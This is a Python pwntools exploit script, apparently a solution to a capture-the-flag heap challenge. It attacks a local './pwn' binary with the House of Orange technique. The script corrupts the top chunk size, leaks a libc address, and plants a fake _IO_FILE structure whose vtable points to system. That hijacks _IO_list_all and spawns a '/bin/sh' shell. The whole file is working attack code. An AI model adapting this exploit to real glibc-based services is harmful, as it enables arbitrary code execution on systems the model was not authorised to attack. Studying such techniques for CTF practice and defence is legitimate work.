# -*- coding: UTF-8 -*-
from pwn import *

context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]

#io = remote('47.108.195.119', 20182)
# libc = ELF('./libc-2.31.so')
io = process('./pwn')
libc = ELF('/glibc/2.23/64/lib/libc.so.6')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))
def add(idx,size):
	sl('1')
	sla('Index?\n',str(idx))
	sla('Size?\n',str(size))
def show(idx):
	sl('2')
	sla('Index?\n',str(idx))
	
def edit(idx,content):
	sl('3')
	sla('Index?\n',str(idx))
	sa('content:\n',content)
		
def delete(idx):
	sl('4')
	sla('Index?\n',str(idx))


#sla('请输入你的队伍名称:','SN-天虞')
#sla('请输入你的id或名字:','一梦不醒')

def menu(index):
    sla("choice :",str(index))
def create(size,content):
    menu(1)
    sla("of it\n",str(size))
    sa("ame?\n", content)
def show():
    menu(3)
def edit(size,content):
    menu(2)
    sla("of it\n",str(size))
    sa("ame\n", content)

heap = int(rl(),16) - 0x10
lg('heap') 

create(0x20,"aaaaa\n")
edit(0x30,b"a"*0x28+p64(0xfb1)) # house of orange

create(0xff0,"bbbb\n")
create(0x48,"\n")

show()

ru("is : ")
info=uu64(rn(6))
lg("info")
libc_address= info - 0x3c410a

lg('libc_address')
malloc_hook = libc_address + libc.symbols['__malloc_hook']
lg('malloc_hook')
_IO_list_all_addr = libc_address + libc.sym['_IO_list_all']
lg('_IO_list_all_addr')
system_addr = libc_address + libc.sym['system']
lg('system_addr')

vtable_addr = heap + 0x178
fake = "/bin/sh\x00"+p64(0x61)
fake += p64(0xDEADBEEF)+p64(_IO_list_all_addr-0x10)
fake +=p64(1)+p64(2) # fp->_IO_write_ptr > fp->_IO_write_base
fake = fake.ljust(0xc0,"\x00")
fake += p64(0)*3+p64(vtable_addr) # mode <=0


payload = 'a'*0x40
payload += fake
payload += 'a'*0x10
payload += p64(system_addr)

edit(len(payload),payload)
#dbg()
ru(": ")
sl('1')
irt()


